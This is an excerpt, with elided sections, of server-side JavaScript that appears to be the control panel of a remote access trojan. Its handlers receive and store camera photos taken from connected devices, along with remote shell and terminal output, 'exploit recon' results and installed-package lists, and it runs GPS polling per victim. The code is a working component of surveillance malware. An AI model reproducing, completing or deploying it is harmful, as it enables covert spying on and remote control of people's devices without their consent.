...
class Clients {
    ...
    setupListeners(clientID) {
        ...
        socket.on(CONST.messageKeys.camera, (data) => {
            if (data.image) {
                try {
                    ...
                    // Ensure client photos directory exists
                    let clientPhotosDir = path.join(CONST.photosFullPath, clientID);
                    if (!fs.existsSync(clientPhotosDir)) fs.mkdirSync(clientPhotosDir, { recursive: true });

                    fs.writeFile(filePath, Buffer.from(uint8Arr), (error) => {
                        if (!error) {
                            client.get('photos').push({
                                time: new Date(),
                                path: CONST.photosFolder + '/' + clientID + '/' + epoch + '.jpg'
                            }).write();
                            logManager.log(CONST.logTypes.info, clientID + " Camera photo received");
                        } else {
                            logManager.log(CONST.logTypes.error, "Camera save error: " + error);
                        }
                    });
                } catch (e) {
                    logManager.log(CONST.logTypes.error, "Camera error: " + e.message);
                }
            }
        });
        //                 client.get('photos').push({
        ...
        socket.on(CONST.messageKeys.shellOutput, (data) => {
            client.get('shellLog').push({
                time: new Date(),
            ...
            logManager.log(CONST.logTypes.info, clientID + " Shell Output Recieved");
        });

        socket.on(CONST.messageKeys.alpineOutput, (data) => {
            client.get('alpineLog').push({
                time: new Date(),
                command: data.command || '',
                output: data.output || '',
                error: data.error || '',
            ...
            logManager.log(CONST.logTypes.info, clientID + " Alpine Output Recieved");
        });

        socket.on(CONST.messageKeys.exploitReconOutput, (data) => {
            client.get('exploitRecon').assign({
                time: new Date(),
            ...
            logManager.log(CONST.logTypes.info, clientID + " Exploit Recon Output Recieved");
        });

        socket.on(CONST.messageKeys.packagesOutput, (data) => {
            client.get('packagesLog').push({
                time: new Date(),
                command: data.command || '',
                output: data.output || '',
                error: data.error || '',
            ...
            if (data.command && data.command.startsWith('list')) {
                let packages = [];
                (data.output || '').split('\n').forEach((line) => {
                    let m = line.match(/^([a-zA-Z0-9_+.-]+)-[0-9]/);
                    if (m && !packages.includes(m[1])) packages.push(m[1]);
                });
                client.get('packages').assign({ time: new Date(), list: packages }).write();
            }
            logManager.log(CONST.logTypes.info, clientID + " Package Output Recieved");
        });

        socket.on(CONST.messageKeys.alpineTermOutput, (data) => {
            ...
            logManager.log(CONST.logTypes.info, clientID + " Alpine Term " + (data.event || 'output'));
        });
    }
    ...
    getClientDataByPage(clientID, page, filter = undefined) {
        ...
        if (client !== undefined) {
            ...
            else if (page === "terminal") pageData = clientDB.get('shellLog').sortBy('time').reverse().value();
            else if (page === "alpine") pageData = clientDB.get('alpineLog').sortBy('time').reverse().value();
            else if (page === "exploits") pageData = clientData.exploitRecon || {};
            else if (page === "packages") pageData = clientData.packages || { list: [] };
    ...
    deleteClient(clientID) {
        ...
        if (this.clientConnections[clientID]) delete this.clientConnections[clientID];
        if (this.gpsPollers[clientID]) clearInterval(this.gpsPollers[clientID]);
        if (this.ignoreDisconnects[clientID]) delete this.ignoreDisconnects[clientID];
        if (this.clientDatabases[clientID]) delete this.clientDatabases[clientID];

        // Remove the client's data file so we don't leave artifacts behind
        let dataFile = path.join(__dirname, '../clientData/', clientID + '.json');
        fs.existsSync(dataFile) && fs.unlinkSync(dataFile);

        logManager.log(CONST.logTypes.success, clientID + " Deleted");
    }
